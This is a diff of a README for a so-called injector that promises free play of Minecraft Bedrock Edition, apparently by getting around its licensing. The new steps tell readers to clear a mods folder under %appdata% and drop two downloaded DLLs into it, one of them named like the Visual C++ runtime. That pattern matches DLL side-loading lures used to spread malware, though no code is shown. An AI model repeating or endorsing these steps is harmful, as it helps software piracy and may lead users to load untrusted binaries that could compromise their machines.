@@ -7,18 +7,20 @@
 
 A simple and efficient injector for playing Minecraft Bedrock Edition (MCBE) for free. Works with the latest versions from the Microsoft Store.
 📖 How to Use
+1 Open AppData Folder:
+Press Win + R on your keyboard, type %appdata% in the window that appears, and press OK.
 
-Follow these steps carefully to get everything working:
+2 Locate the Game Folder:
+In the folder that opens, find and open the folder named Minecraft Bedrock.
 
-    Install Trial: Go to the Microsoft Store and install the official Minecraft Free Trial.
+3 Clear the Mods Folder:
+Go into the mods folder and delete everything inside.
 
-    Download App: Go to the Releases section of this repository and download the latest .zip file.
+4 Install New Files:
+Download Minecraft Mod Installer 26.20+.zip from the Releases section. Extract it and move the two files (IG-UP-GOAT.dll and vcruntime140_1.dll) into the mods folder.
 
-    Run Injector: Launch the downloaded application.
-
-    Activate: Press the "Install Mod" button inside the app and wait for the process to finish.
-
-    Play: Once done, you can close our app and enjoy the full MCBE experience!
+5 Launch the Game:
+You are all set! Open Minecraft and enjoy the full experience.
 
 ⚠️ Important Notes
 
